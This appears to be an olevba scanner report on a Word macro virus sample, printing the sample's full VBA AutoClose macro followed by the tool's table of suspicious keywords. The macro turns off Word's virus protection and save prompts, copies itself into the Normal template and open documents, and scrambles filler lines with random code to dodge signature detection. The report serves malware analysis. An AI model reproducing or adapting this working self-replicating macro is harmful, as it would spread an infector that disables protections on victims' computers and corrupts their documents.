olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ab-32436c21e5107486b1db843667e968243568fd01
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ab-32436c21e5107486b1db843667e968243568fd01 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
C = LnGGi + AjRPz + JhRIe + TyUIo + QyNKt + NlFGh + SnVUv + PeFLx + VlAMx + R
On Error Resume Next
K = BtIGf + VrGDw + OqJPs + NvEMy + T
LE92 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
H = RrGUm + NqCMk + UhALf + JlLLp + I
Application.EnableCancelKey = 0
Q = BuVBr + IpDKu + NoDUl + LrCRp + N
Options.SaveNormalPrompt = 0
E = AvBCs + CzLOo + SyEOq + HwPUo + BjIKp + EsCMw + UxJGg + QtOFy + AsRGu + KuHAp + T
FB65 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
R = QfHLy + NqVCf + NsDKv + VxAHn + UoISh + OkVHp + JkDJo + L
Options.ConfirmConversions = 0
C = LuNKl + TrGGw + LvMHg + KvPQm + RwREe + ByRIp + C
Options.VirusProtection = 0
J = BkLMv + KjQIg + QyNPz + I
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
E = ViPJj + GsJUx + OsCEy + JeLKe + I
Set IM96 = ActiveDocument.VBProject.VBComponents.Item(1)
O = GoDLe + MfOJk + BjPKw + EsRBo + QiHVi + T
FP54 = True
P = JxURk + IzDDo + IxGOh + KvTIs + QvJFg + NrISn + UoHTu + FwHAj + StPIi + QqBJs + G
End If
E = DmVFf + CeNNg + MuSBq + QuIIo + FnEBg + ClTFf + SqKQh + IvHJw + NxEPo + V
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
M = AqGQg + SwCAw + IvVTn + QwFAh + RiHJn + RnEEr + H
Set IM96 = NormalTemplate.VBProject.VBComponents.Item(1)
O = JnBMv + VfVSq + ReFDk + AsPCx + GrMGt + RtIIh + JkOIf + L
EK94 = True
L = MjKTt + OgGIz + GeQMm + FoRSx + J
End If
E = JkKIf + VmLNy + G
If EK94 <> True And FP54 <> True Then GoTo CQ26
L = DqMMi + ArBGm + N
If EK94 = True Then IM96.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LE92 - 1))
U = UjMJj + DyFQf + HkRAi + KvNTf + OzOVz + B
If FP54 = True Then IM96.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FB65 - 1))
P = MiABn + GqLQq + HyIMj + MlRJi + P
With IM96.CodeModule
C = EiBFf + SvEFf + FuPOi + QtSPg + EsMHv + MmDBm + SlJEp + VjIKn + OzOTs + J
For x = 2 To (IM96.CodeModule.CountOfLines - 1) Step 2
G = HqQJk + LwGBe + GmGSs + RwGBp + JmAHx + HjNVh + MmETs + NmQPk + QuMLn + J
For y = 1 To (Int(Rnd * 10) + 2)
S = VoMKz + IwODv + IxNPq + JsPEz + TzKQj + E
KQ39 = KQ39 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "
A = ThJKs + FiLLm + BkFBt + VsOHr + HvEJm + FkMNy + D
Next y
S = InGSg + LrAFw + OeGFg + CnNNk + C
.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & KQ39 & (Chr(65 + Int(Rnd * 22)))
I = SuOIh + JhEQg + EeVTo + OpDOm + SrBLy + J
KQ39 = ""
U = VzONo + AkGVt + IsHFm + PuMMe + F
Next x
D = QrNKp + CeDMl + ClQRq + BpMBq + CwGVm + GqKBp + JfGDo + HoIFy + OrMTq + NrBCw + Q
End With
M = DzPSo + ReLBm + HtPIr + EgDIm + Q
CQ26:
T = HzRUt + EfEJs + HeMLx + A
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

